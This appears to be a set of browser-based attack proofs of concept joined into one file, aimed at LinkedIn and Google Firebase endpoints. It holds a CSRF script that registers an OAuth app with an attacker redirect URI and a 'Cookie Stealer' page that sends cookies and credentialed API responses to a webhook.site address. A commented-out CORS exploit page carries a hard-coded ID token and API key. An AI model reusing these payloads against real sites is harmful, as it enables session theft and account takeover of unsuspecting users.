<html>
	<script>
		var xhr = new XMLHttpRequest();
		xhr.onload = handleResponse;
		xhr.open('get', 'https://px.ads.linkedin.com/wa/', true);
		xhr.withCredentials = true;
		xhr.send();
		function handleResponse() {
			var token = this.responseText.match("name='csrfmiddlewaretoken' value=(.*)? />")[1].trim()
			var token_stripped = token.substring(0,token.length -1).substring(1)
			var createApp = new XMLHttpRequest();
			createApp.open('post', 'https://px.ads.linkedin.com/wa/', true);
			createApp.withCredentials = true;
			createApp.setRequestHeader("Content-type","application/x-www-form-urlencoded")
            var payload = 'csrfmiddlewaretoken='+token_stripped+'&authorization_grant_type=authorization-code&name=waymobetta&client_type=confidential&redirect_uris=https%3A%2F%2F████'
            createApp.send(payload);
		};
	</script>
    
</html>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Cookie Stealer</title>
    <script>
        // Function to send data to an attacker's server
        function exfiltrateData(data) {
            fetch("https://webhook.site/c0e8e9d5-f4b5-4666-aba6-b4a814e8cf80", {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify(data)
            });
        }

        // Capture cookies
        const cookies = document.cookie;
        console.log("Cookies:", cookies); // Log cookies to the console for verification

        // Optional: Send cookies and test API access
        fetch("https://px.ads.linkedin.com/wa/", {
            method: "GET",
            credentials: "include", // Include cookies with the request
            headers: {
                "Authorization": "Bearer YOUR_AUTH_TOKEN", // Include token if needed
                "Content-Type": "application/json"
            }
        })
        .then(response => response.text())
        .then(apiResponse => {
            // Exfiltrate cookies and API response
            exfiltrateData({
                cookies: cookies,
                apiResponse: apiResponse
            });

            // Display cookies and response on the page
            document.body.innerHTML += `<h2>Cookies:</h2><pre>${cookies || "No cookies available"}</pre>`;
            document.body.innerHTML += `<h2>API Response:</h2><pre>${apiResponse || "No response"}</pre>`;
        })
        .catch(err => {
            // Handle errors
            console.error("Error:", err);
            document.body.innerHTML += `<h2>Error:</h2><pre>${err.toString()}</pre>`;
            exfiltrateData({ error: err.toString() });
        });
    </script>
</head>
<body>
    <h1>Cookie Stealer</h1>
    <p>This page will collect your cookies and attempt to fetch sensitive information!</p>
</body>
</html>


<!-- <!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CORS Exploit PoC</title>
</head>
<body>
    <h1>CORS Exploit Demo</h1>
    <p id="result">Fetching data...</p>
    <script>
        // Define the API endpoint and payload
        const apiEndpoint = "https://identitytoolkit.googleapis.com/v1/accounts:lookup?key=AIzaSyC7J-OjmaQ6igkRmD5KNq2ZjbBDNgVNcIg";
        const payload = {
            idToken: "eyJhbGciOiJSUzI1NiIsImtpZCI6IjkyODg2OGRjNDRlYTZhOThjODhiMzkzZDM2NDQ1MTM2NWViYjMwZDgiLCJ0eXAiOiJKV1QifQ.eyJpc3MiOiJodHRwczovL3NlY3VyZXRva2VuLmdvb2dsZS5jb20vcm9ib3NoYWRvdy1uZXR3b3JrLXNjYW5uZXIiLCJhdWQiOiJyb2Jvc2hhZG93LW5ldHdvcmstc2Nhbm5lciIsImF1dGhfdGltZSI6MTczMjIwNjY0OSwidXNlcl9pZCI6IkRRQk5Ib25NaWFiSFcyNG15Y1FvRFNvamk3MzIiLCJzdWIiOiJEUUJOSG9uTWlhYkhXMjRteWNRb0RTb2ppNzMyIiwiaWF0IjoxNzMyMjA2NjQ5LCJleHAiOjE3MzIyMTAyNDksImVtYWlsIjoidGVzdGluZ0Byb2Jvc2hhZG93LmNvbSIsImVtYWlsX3ZlcmlmaWVkIjpmYWxzZSwiZmlyZWJhc2UiOnsiaWRlbnRpdGllcyI6eyJlbWFpbCI6WyJ0ZXN0aW5nQHJvYm9zaGFkb3cuY29tIl19LCJzaWduX2luX3Byb3ZpZGVyIjoicGFzc3dvcmQifX0.fH-Lz921t5XQDGcVxnFdqX_KkyzXOKQak1KYsEkTWMPC-Fv48MC4rVF4Imju8sEluthvebttL9Bbu5bTtqosToMeWcyi1bYtpkALHNyQIWdKOTRQzx2TjrauTnCvIg8pTQwCwk0do-sLf4Pgr6KsFYmSL4IMpVOjuHRsFnS5at0xANKPAKyC7-Bj4HzIMkBEd5SgcgIs3rngO39gtpa4IV1p1KjInC4eIwx95mLi49Gl-5KfT-SUwygIEDA7K_1NZbnOq423-TNSgEvaoavHOE1ccixjgI1SrbxDSeem_6jBnkWv8MGqa_Cljzj_vVJ4Dfc2WhN9BLdS3omd87E5_A"
            // Replace with the victim's token
        };

        // Function to fetch data
        async function fetchData() {
            try {
                const response = await fetch(apiEndpoint, {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json",
                        "X-Client-Version": "Firefox/JsCore/9.23.0/FirebaseCore-web",
                        "X-Firebase-Gmpid": "1:23092714539:web:301a575dc5381b26689e6e",
                    },
                    body: JSON.stringify(payload),
                });

                // Check if the response is successful
                if (!response.ok) {
                    throw new Error(`HTTP error! Status: ${response.status}`);
                }

                // Parse and display the response
                const data = await response.json();
                console.log("Fetched Data:", data);
                document.getElementById("result").textContent = JSON.stringify(data, null, 2);
            } catch (error) {
                console.error("Error fetching data:", error);
                document.getElementById("result").textContent = `Error: ${error.message}`;
            }
        }

        // Trigger the fetch on page load
        fetchData();
    </script>
</body>
</html> -->
